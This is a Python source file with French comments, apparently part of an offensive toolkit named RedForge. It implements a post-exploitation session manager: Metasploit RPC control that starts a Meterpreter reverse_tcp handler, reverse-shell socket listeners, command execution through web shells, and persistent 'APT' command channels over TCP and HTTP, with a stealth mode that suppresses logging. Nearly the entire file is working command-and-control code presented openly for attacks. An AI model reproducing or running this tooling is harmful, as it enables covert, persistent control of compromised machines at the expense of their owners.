#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gestionnaire de sessions pour Metasploit, shells et connexions distantes
Version APT avec support des sessions persistantes et furtives
Version autonome - Sans dépendances externes problématiques
"""

import json
import subprocess
import threading
import time
import os
import socket
import sys
from typing import Dict, List, Any, Optional, Callable
from datetime import datetime
from pathlib import Path
from enum import Enum
import base64

# ============================================
# Console colorée intégrée (sans dépendance rich)
# ============================================

class ConsoleColors:
    """Couleurs pour le terminal"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


def print_success(message: str):
    """Affiche un message de succès en vert"""
    print(f"{ConsoleColors.GREEN}✅ {message}{ConsoleColors.RESET}")


def print_error(message: str):
    """Affiche un message d'erreur en rouge"""
    print(f"{ConsoleColors.RED}❌ {message}{ConsoleColors.RESET}")


def print_warning(message: str):
    """Affiche un message d'avertissement en jaune"""
    print(f"{ConsoleColors.YELLOW}⚠️ {message}{ConsoleColors.RESET}")


def print_info(message: str):
    """Affiche un message d'information en bleu"""
    print(f"{ConsoleColors.BLUE}ℹ️ {message}{ConsoleColors.RESET}")


def print_header(message: str):
    """Affiche un en-tête"""
    print(f"{ConsoleColors.RED}{'=' * 60}{ConsoleColors.RESET}")
    print(f"{ConsoleColors.BOLD}{message}{ConsoleColors.RESET}")
    print(f"{ConsoleColors.RED}{'=' * 60}{ConsoleColors.RESET}")


# ============================================
# Classes principales
# ============================================

class SessionType(Enum):
    """Types de sessions supportés"""
    METERPRETER = "meterpreter"
    REVERSE_SHELL = "reverse_shell"
    SSH = "ssh"
    WEB_SHELL = "web_shell"
    SQL_SHELL = "sql_shell"
    CUSTOM = "custom"
    APT_PERSISTENT = "apt_persistent"


class SessionStatus(Enum):
    """Statuts possibles d'une session"""
    ACTIVE = "active"
    INACTIVE = "inactive"
    CLOSED = "closed"
    ERROR = "error"
    PERSISTENT = "persistent"


class SessionManager:
    """Gère toutes les sessions actives avec support APT"""
    
    def __init__(self, stealth_mode: bool = False, apt_mode: bool = False):
        """
        Initialise le gestionnaire de sessions
        
        Args:
            stealth_mode: Mode furtif (logs minimisés)
            apt_mode: Mode APT (sessions persistantes)
        """
        self.sessions: Dict[str, Dict[str, Any]] = {}
        self.session_counter = 0
        self.session_history: List[Dict[str, Any]] = []
        self._metasploit_client = None
        self._callbacks: Dict[str, List[Callable]] = {}
        self.persistent_sessions_file = Path.home() / ".RedForge" / "persistent_sessions.json"
        self.stealth_mode = stealth_mode
        self.apt_mode = apt_mode
        
        # Créer le répertoire de configuration
        self.persistent_sessions_file.parent.mkdir(parents=True, exist_ok=True)
        
        # Charger les sessions persistantes
        self._load_persistent_sessions()
        
        # Démarrer le thread de monitoring
        self._monitoring_thread = None
        self._stop_monitoring = threading.Event()
        self._start_monitoring()
        
        # Listeners actifs
        self._listeners: Dict[int, socket.socket] = {}
        self._listener_threads: Dict[int, threading.Thread] = {}
        
        if not self.stealth_mode:
            print_success("Session Manager initialisé")
            if self.apt_mode:
                print_info("Mode APT activé - Sessions persistantes")
    
    def set_stealth_mode(self, enabled: bool):
        """Active/désactive le mode furtif"""
        self.stealth_mode = enabled
        if enabled and not self.stealth_mode:
            print_info("Mode furtif activé pour les sessions")
    
    def set_apt_mode(self, enabled: bool):
        """Active/désactive le mode APT"""
        self.apt_mode = enabled
        if enabled:
            print_info("Mode APT activé - Sessions persistantes")
    
    def _get_metasploit_client(self):
        """Initialise et retourne le client Metasploit RPC"""
        if self._metasploit_client is not None:
            return self._metasploit_client
        
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            
            # Configuration par défaut
            host = "127.0.0.1"
            port = 55553
            password = "RedForge2024"
            
            self._metasploit_client = MsfRpcClient(
                password,
                server=host,
                port=port,
                ssl=False
            )
            if not self.stealth_mode:
                print_success("Connexion à Metasploit RPC établie")
        except ImportError:
            if not self.stealth_mode:
                print_warning("pymetasploit3 non installé. Metasploit RPC indisponible.")
            self._metasploit_client = None
        except Exception as e:
            if not self.stealth_mode:
                print_error(f"Erreur connexion Metasploit: {e}")
            self._metasploit_client = None
        
        return self._metasploit_client
    
    def create_session(self, session_type: str, target: str, 
                       metadata: Dict = None, session_id: str = None) -> str:
        """
        Crée une nouvelle session
        
        Args:
            session_type: Type de session
            target: Cible de la session
            metadata: Métadonnées supplémentaires
            session_id: ID personnalisé (optionnel)
        """
        if session_id is None:
            self.session_counter += 1
            session_id = f"{session_type}_{self.session_counter}_{int(time.time())}"
        
        session = {
            "id": session_id,
            "type": session_type,
            "target": target,
            "status": SessionStatus.ACTIVE.value,
            "created_at": datetime.now().isoformat(),
            "last_active": datetime.now().isoformat(),
            "metadata": metadata or {},
            "commands_history": [],
            "output_buffer": [],
            "interactive": False,
            "process": None,
            "socket": None,
            "stealth": self.stealth_mode,
            "apt_persistent": self.apt_mode
        }
        
        self.sessions[session_id] = session
        self.session_history.append(session.copy())
        
        if not self.stealth_mode:
            print_success(f"Session créée: {session_id} sur {target}")
        
        self._trigger_callback("on_session_created", session)
        self._save_persistent_sessions()
        
        return session_id
    
    def get_session(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Récupère une session par son ID"""
        return self.sessions.get(session_id)
    
    def get_all_sessions(self, status: Optional[str] = None) -> List[Dict[str, Any]]:
        """Récupère toutes les sessions"""
        if status:
            return [s for s in self.sessions.values() if s["status"] == status]
        return list(self.sessions.values())
    
    def get_active_sessions(self) -> List[Dict[str, Any]]:
        """Récupère toutes les sessions actives"""
        return self.get_all_sessions(status=SessionStatus.ACTIVE.value)
    
    def update_session(self, session_id: str, **kwargs) -> bool:
        """Met à jour une session"""
        if session_id not in self.sessions:
            return False
        
        for key, value in kwargs.items():
            if key in self.sessions[session_id]:
                self.sessions[session_id][key] = value
        
        self.sessions[session_id]["last_active"] = datetime.now().isoformat()
        self._save_persistent_sessions()
        return True
    
    def close_session(self, session_id: str, reason: str = "closed") -> bool:
        """Ferme une session"""
        if session_id not in self.sessions:
            return False
        
        session = self.sessions[session_id]
        session["status"] = SessionStatus.CLOSED.value
        session["closed_at"] = datetime.now().isoformat()
        session["close_reason"] = reason
        
        # Fermer le processus associé si existant
        if session.get("process"):
            try:
                session["process"].terminate()
            except:
                pass
        
        # Fermer le socket si existant
        if session.get("socket"):
            try:
                session["socket"].close()
            except:
                pass
        
        if not self.stealth_mode:
            print_info(f"Session fermée: {session_id} ({reason})")
        
        self._trigger_callback("on_session_closed", session)
        self._save_persistent_sessions()
        
        return True
    
    def add_command_history(self, session_id: str, command: str, 
                            output: str = None) -> bool:
        """Ajoute une commande à l'historique de la session"""
        if session_id not in self.sessions:
            return False
        
        entry = {
            "timestamp": datetime.now().isoformat(),
            "command": command,
            "output": output[:500] if output else None
        }
        
        self.sessions[session_id]["commands_history"].append(entry)
        self.update_session(session_id)
        
        return True
    
    def execute_command(self, session_id: str, command: str) -> Dict[str, Any]:
        """
        Exécute une commande sur une session
        
        Args:
            session_id: ID de la session
            command: Commande à exécuter
            
        Returns:
            Dictionnaire avec le résultat
        """
        result = {
            "success": False,
            "session_id": session_id,
            "command": command,
            "output": "",
            "error": None
        }
        
        session = self.get_session(session_id)
        
        if not session:
            result["error"] = "Session non trouvée"
            return result
        
        if session["status"] != SessionStatus.ACTIVE.value:
            result["error"] = f"Session {session['status']}"
            return result
        
        # Exécution selon le type de session
        session_type = session["type"]
        
        if session_type == SessionType.METERPRETER.value:
            result = self._execute_meterpreter_command(session, command)
        elif session_type == SessionType.REVERSE_SHELL.value:
            result = self._execute_reverse_shell_command(session, command)
        elif session_type == SessionType.SSH.value:
            result = self._execute_ssh_command(session, command)
        elif session_type == SessionType.WEB_SHELL.value:
            result = self._execute_web_shell_command(session, command)
        elif session_type == SessionType.APT_PERSISTENT.value:
            result = self._execute_apt_command(session, command)
        else:
            # Exécuteur personnalisé
            executor = session.get("metadata", {}).get("executor")
            if executor:
                try:
                    exec_result = executor(command)
                    result["success"] = exec_result.get("success", False)
                    result["output"] = exec_result.get("output", "")
                except Exception as e:
                    result["error"] = str(e)
            else:
                result["error"] = "Aucun exécuteur configuré pour cette session"
        
        if result["success"]:
            self.add_command_history(session_id, command, result["output"])
            self.update_session(session_id)
        
        return result
    
    def _execute_meterpreter_command(self, session: Dict, command: str) -> Dict[str, Any]:
        """Exécute une commande sur une session Meterpreter"""
        result = {
            "success": False,
            "command": command,
            "output": ""
        }
        
        client = self._get_metasploit_client()
        if not client:
            result["error"] = "Metasploit RPC non disponible"
            return result
        
        try:
            session_id = session.get("metadata", {}).get("msf_session_id")
            if not session_id:
                result["error"] = "ID session Metasploit manquant"
                return result
            
            msf_session = client.sessions.session(str(session_id))
            output = msf_session.write(command + "\n")
            result["output"] = output
            result["success"] = True
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _execute_reverse_shell_command(self, session: Dict, command: str) -> Dict[str, Any]:
        """Exécute une commande sur un reverse shell"""
        result = {
            "success": False,
            "command": command,
            "output": ""
        }
        
        process = session.get("process")
        if not process:
            result["error"] = "Processus shell non trouvé"
            return result
        
        try:
            process.stdin.write(command + "\n")
            process.stdin.flush()
            time.sleep(0.5)
            
            output = ""
            # Lire la sortie
            import select
            if select.select([process.stdout], [], [], 0.5)[0]:
                for line in process.stdout.readlines():
                    output += line
            
            result["output"] = output
            result["success"] = True
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _execute_ssh_command(self, session: Dict, command: str) -> Dict[str, Any]:
        """Exécute une commande sur une session SSH"""
        result = {
            "success": False,
            "command": command,
            "output": ""
        }
        
        ssh_client = session.get("metadata", {}).get("ssh_client")
        if not ssh_client:
            result["error"] = "Client SSH non trouvé"
            return result
        
        try:
            stdin, stdout, stderr = ssh_client.exec_command(command)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            
            result["output"] = output + error
            result["success"] = True
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _execute_web_shell_command(self, session: Dict, command: str) -> Dict[str, Any]:
        """Exécute une commande sur un web shell"""
        result = {
            "success": False,
            "command": command,
            "output": ""
        }
        
        import urllib.request
        import urllib.parse
        
        web_url = session.get("metadata", {}).get("web_url")
        if not web_url:
            result["error"] = "URL web shell non trouvée"
            return result
        
        try:
            encoded_cmd = base64.b64encode(command.encode()).decode()
            url = f"{web_url}?cmd={urllib.parse.quote(encoded_cmd)}"
            
            with urllib.request.urlopen(url, timeout=30) as response:
                result["output"] = response.read().decode('utf-8', errors='ignore')
                result["success"] = True
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _execute_apt_command(self, session: Dict, command: str) -> Dict[str, Any]:
        """Exécute une commande sur une session APT persistante"""
        result = {
            "success": False,
            "command": command,
            "output": ""
        }
        
        channel = session.get("metadata", {}).get("apt_channel")
        if not channel:
            result["error"] = "Canal APT non trouvé"
            return result
        
        try:
            if channel.get("type") == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((channel["host"], channel["port"]))
                sock.send(command.encode())
                
                response = b""
                while True:
                    try:
                        data = sock.recv(4096)
                        if not data:
                            break
                        response += data
                    except socket.timeout:
                        break
                
                sock.close()
                result["output"] = response.decode('utf-8', errors='ignore')
                result["success"] = True
                
            elif channel.get("type") == "http":
                import urllib.request
                import urllib.parse
                
                url = channel.get("url")
                data = urllib.parse.urlencode({"cmd": command}).encode()
                req = urllib.request.Request(url, data=data, method="POST")
                
                with urllib.request.urlopen(req, timeout=30) as response:
                    result["output"] = response.read().decode('utf-8', errors='ignore')
                    result["success"] = True
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def create_meterpreter_session(self, target: str, lhost: str = "0.0.0.0", 
                                   lport: int = 4444, session_id: str = None) -> Optional[str]:
        """Crée une session Meterpreter via Metasploit"""
        client = self._get_metasploit_client()
        if not client:
            print_error("Metasploit RPC non disponible")
            return None
        
        try:
            exploit = client.modules.use('exploit', 'multi/handler')
            exploit['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
            exploit['LHOST'] = lhost
            exploit['LPORT'] = lport
            
            job_id = exploit.execute()
            
            session_id = self.create_session(
                SessionType.METERPRETER.value,
                target,
                {"msf_job_id": job_id, "lhost": lhost, "lport": lport},
                session_id
            )
            
            if not self.stealth_mode:
                print_success(f"Session Meterpreter en attente sur {lhost}:{lport}")
            
            return session_id
            
        except Exception as e:
            print_error(f"Erreur création session Meterpreter: {e}")
            return None
    
    def create_reverse_shell_session(self, target: str, lhost: str = "0.0.0.0",
                                     lport: int = 4444, session_id: str = None) -> Optional[str]:
        """
        Crée une session reverse shell avec listener
        
        Args:
            target: Cible
            lhost: IP d'écoute
            lport: Port d'écoute
            session_id: ID personnalisé
        """
        session_id_local = None
        
        def handle_client(client_socket, address):
            nonlocal session_id_local
            session_id_local = self.create_session(
                SessionType.REVERSE_SHELL.value,
                target,
                {"address": str(address), "lport": lport},
                session_id
            )
            
            self.update_session(session_id_local, socket=client_socket)
            
            # Buffer de sortie
            output_buffer = []
            
            while True:
                try:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    output = data.decode('utf-8', errors='ignore')
                    output_buffer.append(output)
                    
                    # Mettre à jour le buffer de la session
                    current_session = self.get_session(session_id_local)
                    if current_session:
                        current_session["output_buffer"].extend(output_buffer)
                        output_buffer = []
                        
                except socket.timeout:
                    continue
                except:
                    break
            
            client_socket.close()
            self.close_session(session_id_local, "connection closed")
        
        # Démarrer le listener
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((lhost, lport))
            server.listen(5)
            
            # Stocker le listener
            self._listeners[lport] = server
            
            # Accepter les connexions
            def accept_connections():
                while True:
                    try:
                        client, addr = server.accept()
                        thread = threading.Thread(target=handle_client, args=(client, addr))
                        thread.daemon = True
                        thread.start()
                        self._listener_threads[lport] = thread
                        
                        if not self.stealth_mode:
                            print_success(f"Connexion reçue de {addr}")
                    except:
                        break
            
            accept_thread = threading.Thread(target=accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            if not self.stealth_mode:
                print_success(f"Listener démarré sur {lhost}:{lport}")
            
            return session_id_local or session_id
            
        except Exception as e:
            print_error(f"Erreur création listener: {e}")
            return None
    
    def stop_listener(self, port: int) -> bool:
        """Arrête un listener sur un port spécifique"""
        if port in self._listeners:
            try:
                self._listeners[port].close()
                del self._listeners[port]
                if not self.stealth_mode:
                    print_info(f"Listener arrêté sur le port {port}")
                return True
            except:
                pass
        return False
    
    def stop_all_listeners(self):
        """Arrête tous les listeners actifs"""
        for port in list(self._listeners.keys()):
            self.stop_listener(port)
    
    def create_web_shell(self, target: str, shell_url: str, session_id: str = None) -> Optional[str]:
        """Attache un web shell existant"""
        session_id = self.create_session(
            SessionType.WEB_SHELL.value,
            target,
            {"web_url": shell_url},
            session_id
        )
        
        if not self.stealth_mode:
            print_success(f"Web shell attaché: {shell_url}")
        
        return session_id
    
    def create_apt_persistent_session(self, target: str, channel_config: Dict,
                                      session_id: str = None) -> Optional[str]:
        """Crée une session APT persistante"""
        session_id = self.create_session(
            SessionType.APT_PERSISTENT.value,
            target,
            {"apt_channel": channel_config, "persistent": True},
            session_id
        )
        
        if not self.stealth_mode:
            print_success(f"Session APT persistante créée: {session_id}")
        
        return session_id
    
    def attach_executor(self, session_id: str, executor: Callable) -> bool:
        """Attache un exécuteur de commandes à une session"""
        if session_id not in self.sessions:
            return False
        
        self.sessions[session_id]["metadata"]["executor"] = executor
        return True
    
    def _save_persistent_sessions(self):
        """Sauvegarde les sessions persistantes"""
        if not self.apt_mode:
            return
        
        try:
            persistent = []
            for session in self.sessions.values():
                if session.get("apt_persistent") or session.get("status") == SessionStatus.PERSISTENT.value:
                    # Créer une copie sérialisable
                    session_copy = session.copy()
                    session_copy.pop("process", None)
                    session_copy.pop("socket", None)
                    session_copy.pop("ssh_client", None)
                    if "executor" in session_copy.get("metadata", {}):
                        del session_copy["metadata"]["executor"]
                    persistent.append(session_copy)
            
            with open(self.persistent_sessions_file, 'w', encoding='utf-8') as f:
                json.dump(persistent, f, indent=4, ensure_ascii=False)
            
        except Exception as e:
            if not self.stealth_mode:
                print_error(f"Erreur sauvegarde sessions persistantes: {e}")
    
    def _load_persistent_sessions(self):
        """Charge les sessions persistantes"""
        if not self.persistent_sessions_file.exists():
            return
        
        try:
            with open(self.persistent_sessions_file, 'r', encoding='utf-8') as f:
                persistent = json.load(f)
            
            for session in persistent:
                session["status"] = SessionStatus.PERSISTENT.value
                self.sessions[session["id"]] = session
            
            if persistent and not self.stealth_mode:
                print_info(f"{len(persistent)} session(s) persistante(s) chargée(s)")
            
        except Exception as e:
            if not self.stealth_mode:
                print_error(f"Erreur chargement sessions persistantes: {e}")
    
    def _start_monitoring(self):
        """Démarre le thread de monitoring des sessions"""
        def monitor():
            while not self._stop_monitoring.is_set():
                try:
                    self.cleanup_stale_sessions()
                    self._heartbeat_check()
                    time.sleep(60)  # Vérifier toutes les minutes
                except:
                    pass
        
        self._monitoring_thread = threading.Thread(target=monitor, daemon=True)
        self._monitoring_thread.start()
    
    def _heartbeat_check(self):
        """Vérifie les sessions actives avec heartbeat"""
        for session_id, session in self.sessions.items():
            if session["status"] == SessionStatus.ACTIVE.value:
                last_active = datetime.fromisoformat(session["last_active"])
                if (datetime.now() - last_active).seconds > 300:  # 5 minutes
                    self.update_session(session_id, status=SessionStatus.INACTIVE.value)
    
    def save_sessions(self, filename: str) -> bool:
        """Sauvegarde toutes les sessions dans un fichier"""
        try:
            serializable = []
            for session in self.sessions.values():
                session_copy = session.copy()
                session_copy.pop("process", None)
                session_copy.pop("socket", None)
                session_copy.pop("ssh_client", None)
                if "executor" in session_copy.get("metadata", {}):
                    del session_copy["metadata"]["executor"]
                serializable.append(session_copy)
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(serializable, f, indent=4, ensure_ascii=False)
            
            if not self.stealth_mode:
                print_success(f"Sessions sauvegardées dans {filename}")
            return True
            
        except Exception as e:
            print_error(f"Erreur sauvegarde sessions: {e}")
            return False
    
    def load_sessions(self, filename: str) -> bool:
        """Charge des sessions depuis un fichier"""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                loaded = json.load(f)
            
            for session in loaded:
                self.sessions[session["id"]] = session
                # Extraire le numéro du compteur
                parts = session["id"].split('_')
                if len(parts) >= 2 and parts[1].isdigit():
                    session_id_num = int(parts[1])
                    if session_id_num > self.session_counter:
                        self.session_counter = session_id_num + 1
            
            if not self.stealth_mode:
                print_success(f"Sessions chargées depuis {filename}")
            return True
            
        except FileNotFoundError:
            print_warning(f"Fichier {filename} non trouvé")
            return False
        except Exception as e:
            print_error(f"Erreur chargement sessions: {e}")
            return False
    
    def get_session_summary(self) -> Dict[str, Any]:
        """Retourne un résumé de toutes les sessions"""
        sessions = self.get_all_sessions()
        active = self.get_active_sessions()
        
        summary = {
            "total_sessions": len(sessions),
            "active_sessions": len(active),
            "persistent_sessions": len([s for s in sessions if s.get("apt_persistent")]),
            "closed_sessions": len([s for s in sessions if s["status"] == SessionStatus.CLOSED.value]),
            "by_type": {},
            "by_target": {}
        }
        
        for session in sessions:
            s_type = session["type"]
            summary["by_type"][s_type] = summary["by_type"].get(s_type, 0) + 1
            
            target = session["target"]
            summary["by_target"][target] = summary["by_target"].get(target, 0) + 1
        
        return summary
    
    def cleanup_stale_sessions(self, max_inactive_minutes: int = 30) -> int:
        """Nettoie les sessions inactives depuis trop longtemps"""
        cleaned = 0
        now = datetime.now()
        
        for session_id, session in list(self.sessions.items()):
            if session["status"] != SessionStatus.ACTIVE.value:
                continue
            
            last_active = datetime.fromisoformat(session["last_active"])
            inactive_minutes = (now - last_active).total_seconds() / 60
            
            if inactive_minutes > max_inactive_minutes:
                self.close_session(session_id, f"inactive for {inactive_minutes:.0f} minutes")
                cleaned += 1
        
        if cleaned > 0 and not self.stealth_mode:
            print_info(f"{cleaned} session(s) inactive(s) nettoyée(s)")
        
        return cleaned
    
    def register_callback(self, event: str, callback: Callable):
        """Enregistre un callback pour un événement"""
        if event not in self._callbacks:
            self._callbacks[event] = []
        self._callbacks[event].append(callback)
    
    def _trigger_callback(self, event: str, data: Any):
        """Déclenche les callbacks pour un événement"""
        if event in self._callbacks:
            for callback in self._callbacks[event]:
                try:
                    callback(data)
                except Exception as e:
                    if not self.stealth_mode:
                        print_error(f"Erreur dans callback {event}: {e}")
    
    def get_session_output(self, session_id: str) -> List[str]:
        """Récupère la sortie bufferisée d'une session"""
        session = self.get_session(session_id)
        if not session:
            return []
        
        output = session.get("output_buffer", [])
        session["output_buffer"] = []
        return output
    
    def stop(self):
        """Arrête proprement le gestionnaire de sessions"""
        self._stop_monitoring.set()
        if self._monitoring_thread:
            self._monitoring_thread.join(timeout=5)
        
        self.stop_all_listeners()
        self._save_persistent_sessions()
        
        if not self.stealth_mode:
            print_info("Session Manager arrêté")


# ============================================
# Point d'entrée pour tests
# ============================================

if __name__ == "__main__":
    print_header("Test du Session Manager")
    
    # Créer une instance
    sm = SessionManager(stealth_mode=False, apt_mode=True)
    
    # Créer une session de test
    session_id = sm.create_session(
        SessionType.REVERSE_SHELL.value,
        "192.168.1.100",
        {"username": "test_user", "os": "Linux"}
    )
    
    print(f"\n✅ Session créée: {session_id}")
    
    # Afficher le résumé
    summary = sm.get_session_summary()
    print(f"\n📊 Résumé des sessions:")
    for key, value in summary.items():
        print(f"   {key}: {value}")
    
    # Créer un reverse shell listener (optionnel)
    # sm.create_reverse_shell_session("target.com", lport=4444)
    
    # Sauvegarder
    sm.save_sessions("test_sessions.json")
    print("\n✅ Sessions sauvegardées")
    
    # Charger
    sm.load_sessions("test_sessions.json")
    print("✅ Sessions chargées")
    
    # Arrêter
    sm.stop()
    
    print("\n✅ Test terminé")